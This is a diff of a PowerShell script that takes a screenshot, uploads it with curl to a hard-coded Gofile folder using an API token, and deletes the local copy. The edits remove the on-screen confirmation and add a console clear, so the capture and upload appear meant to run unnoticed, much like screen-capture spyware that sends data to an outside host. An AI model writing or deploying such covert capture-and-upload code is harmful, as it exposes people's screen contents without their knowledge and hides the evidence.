@@ -18,7 +18,6 @@ Start-Sleep -Milliseconds 20
 $graphics.Dispose()
 $bitmap.Dispose()
 
-Write-Host "Screenshot saved to: $filePath" -ForegroundColor Green
 
 function Upload-FilesToGofile {
     param (
@@ -37,14 +36,14 @@ function Upload-FilesToGofile {
                 curl.exe -sS -F "file=@$FilePath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
                 
                 Remove-Item $FilePath -Force
-                
+                cls
                 Start-Sleep -Milliseconds 200
                 
             }
         }
    
     catch {
-        Write-Host $_.Exception.Message # This is your os.system("cls")
+        Write-Host $_.Exception.Message 
     }
 }
 Upload-FilesToGofile -FilePath $filePath -newFolderId "a96550e5-fd58-4965-a787-a5d20ec20bdc"
